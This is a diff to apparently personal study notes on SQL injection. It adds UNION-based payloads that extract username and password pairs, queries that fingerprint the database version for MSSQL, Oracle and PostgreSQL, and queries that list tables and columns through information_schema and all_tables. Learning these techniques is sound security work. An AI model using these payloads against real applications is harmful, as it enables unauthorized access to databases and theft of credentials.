@@ -2,7 +2,8 @@
 
 1. [SQLi](#sqli)
 2. [SQLi Union](#sqli-union)
-3. [SQLi CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+3. [Examining Database](#examining-database)
+4. [SQLi CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 * SQLi - web security vulnerability; allows attacker to interfere with queries made by app to database.
 
@@ -57,7 +58,7 @@
   * Then, the attacker can submit the input using ```UNION```:
 
     ```sql
-    UNION SELECT username, password FROM users--
+    ' UNION SELECT username, password FROM users--
     ```
 
 ## SQLi Union
@@ -105,4 +106,41 @@
   ```sql
   ' UNION SELECT username || '~' || password FROM users--
   #concatenate output in Oracle using pipe operator
+
+  ' UNION SELECT NULL,username || '~' || password FROM users--
+  #differs based on number of columns
+  ```
+
+## Examining Database
+
+* Querying database type & version:
+
+  ```sql
+  ' UNION SELECT @@version--
+  #output if Microsoft SQL server
+
+  ' UNION SELECT * FROM v$version
+  #output if Oracle
+
+  ' UNION SELECT version()
+  #output if PostgreSQL
+  ```
+
+* Listing contents of database:
+
+  ```sql
+  SELECT * FROM information_schema.tables
+  #returns table names
+
+  SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+  #shows columns and data types of table
+  ```
+
+  ```sql
+  #on Oracle
+  #list tables
+  SELECT * FROM all_tables
+
+  #list columns
+  SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
   ```
